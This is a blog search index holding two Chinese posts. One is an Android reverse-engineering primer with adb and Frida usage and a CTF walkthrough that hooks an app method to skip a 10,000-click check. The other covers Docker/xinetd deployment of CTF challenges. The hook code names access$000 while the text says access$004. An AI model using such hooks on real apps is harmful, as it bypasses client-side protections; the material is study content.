<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android-1</title>
    <url>/2023/10/08/Android-1/</url>
    <content><![CDATA[<blockquote>
<p>不该点开那一篇推文。</p>
</blockquote>
<span id="more"></span>

<ul>
<li>腾讯玄武实验室一篇关于ARM 的文章</li>
</ul>
<p><a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7 – Bypassing ASLR and NX - 8kSec</a></p>
<p>但是看完了这篇文章，突然想学一学安卓安全相关的内容</p>
<h2 id="Android-环境搭建"><a href="#Android-环境搭建" class="headerlink" title="Android 环境搭建"></a>Android 环境搭建</h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><ul>
<li>在windows 和 Linux 下搭建。比较简单的方式：使用Android Studio</li>
</ul>
<ol>
<li>下载 Java，配置环境变量。</li>
</ol>
<p>Linux 使用包管理器进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure>

<p>windows 下在oracle下载 <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>，然后配置</p>
<ol start="2">
<li>下载android studio，使用<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li>
<li>下载 Android SDK，Android studio 打开后如果没有sdk会自行下载，但是有墙，不一定会下载成功，但是总有解决问题的方法（</li>
<li>path: 下载sdk后，将 <code>xxx\platform-tools</code> 加入环境变量，就可以使用adb。翻翻下载的目录，可能有其余有趣的工具，比如qemu</li>
</ol>
<h3 id="运行apk"><a href="#运行apk" class="headerlink" title="运行apk"></a>运行apk</h3><ol>
<li>模拟器</li>
</ol>
<ul>
<li>在安装 WSL2 后导致大部分模拟器不能使用，可以安装WSA，但是万一存在 恶意软件 就会很难搞</li>
</ul>
<p><a href="https://www.bluestacks.cn/">BlueStacks安卓模拟器</a>，配置后，以<strong>管理员运行</strong>，不会失败</p>
<ul>
<li>root：我在修改了配置文件后就成功了。<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li>
</ul>
<ol start="2">
<li>root 真机，这个才是最好的方法。<del>但是买不起</del></li>
</ol>
<ul>
<li>推荐，因为有的不给出x86的lib库</li>
<li>可以在平台买个二手的手机</li>
</ul>
<h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ul>
<li><a href="https://github.com/skylot/jadx">jadx</a></li>
<li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li>
<li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li>
</ul>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul>
<li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li>
<li><a href="https://github.com/frida/frida/releases">firda server</a></li>
</ul>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h2 id="APK结构"><a href="#APK结构" class="headerlink" title="APK结构"></a>APK结构</h2><ul>
<li>APK, 本质上是一个zip文件，我们可以修改文件后缀然后解压。</li>
</ul>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>用于存放需要打包到APK中的静态文件</p>
<p>assets目录<strong>支持任意深度的子目录</strong>，用户可以根据自己的需求任意部署文件夹架构。</p>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>存放的是签名信息，用来保证apk包的完整性和系统的安全。</p>
<p>在编译生成一个apk包时，会对所有要打包的文件做一个校验计算，并把计算结果放在META-INF目录下。在安装时，如果校验结果与META-INF下的内容不一致，系统就不会安装这个apk。从而保证了apk包里的文件不能被随意替换。</p>
<p>META-INF目录下包含的文件有CERT.RSA，CERT.DSA，CERT.SF和MANIFEST.MF</p>
<ul>
<li>CERT.RSA：是开发者利用私钥对APK进行签名的签名文件</li>
<li>CERT.SF，MANIFEST.MF：记录了文件中文件的哈希值</li>
</ul>
<h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>这里存放应用程序依赖的<strong>native库文件</strong>，一般是用C&#x2F;C++编写，这里的lib库可能包含多种不同类型，大体可以分为ARM，X86等架构。</p>
<h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>res是resource的缩写，这个目录存放资源文件，存在这个文件夹下的所有文件都会映射到Android工程的<code>.R</code>文件中，生成对应的ID，访问的时候直接使用资源ID即R.id.filename，res文件夹下可以包含多个文件夹。</p>
<p><strong>res文件夹，存放的也是资源文件，与assets文件夹不同的是，这里是编译后的资源文件。</strong></p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>是Android应用程序的配置文件，是一个用来描述Android应用“整体资讯”的设定文件， Android系统可以根据这个<strong>自我介绍</strong>完整地了解APK应用程序的资讯，每个Android应用程序都必须包含一个AndroidManifest.xml文件，且它的名字是固定的，不能修改。我们在开发Android应用程序的时候，一般都把代码中的每一个Activity，Service，Provider和Receiver在AndroidManifest.xml中注册，只有这样系统才能启动对应的组件，另外这个文件还包含一些权限声明以及使用的SDK版本信息等等。程序打包时，会把AndroidManifest.xml进行简单的编译，便于Android系统识别，编译之后的格式是AXML格式</p>
<h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>传统的Java程序，首先先把Java文件编译成class文件，字节码都保存在了class文件中，Java虚拟机可以通过解释执行这些class文件。</p>
<p>而Dalvik虚拟机是在Java虚拟机进行了优化，执行的是Dalvik字节码，而这些Dalvik字节码是由Java字节码转换而来，一般情况下，Android应用在打包时通过AndroidSDK中的dx工具将Java字节码转换为Dalvik字节码。dx工具可以对多个class文件进行合并，重组，优化，可以达到减小体积，缩短运行时间的目的。</p>
<p>dx工具把每个.class文件的每个区域的内容进行去重，重组，优化重排后生成dex文件，生成的dex文件可以在Dalvik虚拟机执行，且速度比较快</p>
<h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>用来记录资源文件和资源ID之间的映射关系，用来根据资源ID寻找资源。Android的开发是分模块的，res目录专门用来存放资源文件，当在代码中需要调用资源文件时，只需要调用findviewbyId()就可以得到资源文件，每当在res文件夹下放一个文件，aapt就会自动生成对应的ID保存在.R文件，我们调用这个ID就可以，但是只有这个ID还不够，.R文件只是保证编译程序不报错，实际上在程序运行时，系统要根据ID去寻找对应的资源路径，而resources.arsc文件就是用来记录这些ID和资源文件位置对应关系的文件。</p>
<h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin 是一门编程语言，也可以直接运行在Java虚拟机中，这个目录存放kotlin资源</p>
<h2 id="adb-简单使用"><a href="#adb-简单使用" class="headerlink" title="adb 简单使用"></a>adb 简单使用</h2><ul>
<li>将文件放入android机器里</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li>安装应用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>卸载</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>获得shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动指定的activity</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure>

<h2 id="frida-简单使用"><a href="#frida-简单使用" class="headerlink" title="frida 简单使用"></a>frida 简单使用</h2><ul>
<li><p>python 的 frida-tools 和 手机端的 server 必须保持一致的版本, 可以使用python venv</p>
</li>
<li><p>CPU 信息</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<ul>
<li>指向hook 脚本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure>

<ul>
<li>使用python 执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua 获得一个pid号</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    jscode = f.readall()</span><br><span class="line">    hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># 可以操作Android软件并且进行hook</span></span><br></pre></td></tr></table></figure>

<h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><ul>
<li>框架</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>获得类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个实例</span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们也可以查找一个实例</span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">	        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">	        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">	    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<ul>
<li>方法</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态方法</span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例方法</span></span><br><span class="line"><span class="comment">// 1. 查找实例调用</span></span><br><span class="line"><span class="comment">// 2. new一个然后调用</span></span><br></pre></td></tr></table></figure>

<ul>
<li>变量</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure>

<ul>
<li>hook java method</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载: 当一个 class 两个名称相同的方法</span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line">	<span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数的 hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="入门例子"><a href="#入门例子" class="headerlink" title="入门例子"></a>入门例子</h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>两个activity</p>
<ul>
<li>MainActivity</li>
<li>FlagActivity</li>
</ul>
<p>模拟器打开时是MainActivity，但是我们需要运行FlagActivity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure>

<p>FlagActivity 逻辑：点击10000次，但是我们可以hook <code>access$004</code> 使其返回结果大于10000就行(原来的逻辑为点击一次，cnt+&#x3D;1, hook后就是点击一次，返回10001)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>是男人就点击10000次（bushi</del></p>
<ul>
<li>hook.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载hooook.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<ul>
<li>hook.js</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<ul>
<li>运行python脚本，然后在模拟器或者真机上点击一下就行。</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF 出题</title>
    <url>/2023/09/16/CTF%20%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>怎么出题部署环境？</p>
</blockquote>
<span id="more"></span>

<h3 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h3><ol>
<li>首先肯定是安装docker</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>写题目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall</span><br><span class="line">├── flag.txt</span><br><span class="line">├── vuln</span><br><span class="line">├── vuln.c</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>docker 部署，在同级目录添加 Dockerfile，同时配合 xinetd<ul>
<li>修改文件中内容，看注释</li>
</ul>
</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>docker-compose.yml<ul>
<li>自己更改端口就行</li>
</ul>
</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p><strong>坑点</strong>：docker部署题目时，在程序里必须将缓冲器置为0，否则不会显示？</p>
<h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><ul>
<li><p>下载这个链接 <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>，部署比较简单。</p>
</li>
<li><p>修改 bin目录 里的 二进制文件和 flag 文件</p>
</li>
<li><p>dockerfile 修改一行</p>
</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ctf.xinetd 修改</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># 修改</span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf 自己的漏洞程序</span><br></pre></td></tr></table></figure>

<ul>
<li>最后执行README 里的 两条命令就行，比如</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将pub_port 自己想要的端口</span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure>


<p>查看了一眼其内容，使用 chroot沙盒，将文件系统的根目录转化为原先的 <code>/home/ctf</code> 目录，所以要在dockerfile中将lib全部拷贝一份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure>

<h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul>
<li>部署多道ctf题目： <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a>，<a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/">教程</a> 写的很详细。使用起来也很容易</li>
</ul>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul>
<li>内核题目部署，使用 ctf_xinetd 举例</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall  </span><br><span class="line">├── ctf.xinetd  </span><br><span class="line">├── Dockerfile  </span><br><span class="line">├── bin  </span><br><span class="line">│ ├── run.sh  </span><br><span class="line">│ ├── bzImage  </span><br><span class="line">│ └── rootfs.cpio  </span><br><span class="line">├── README.md</span><br><span class="line">└── start.sh </span><br></pre></td></tr></table></figure>

<ul>
<li>docker 安装环境</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">	apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">	apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">	libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>重要的是修改 ctf.xinetd  文件</li>
</ul>
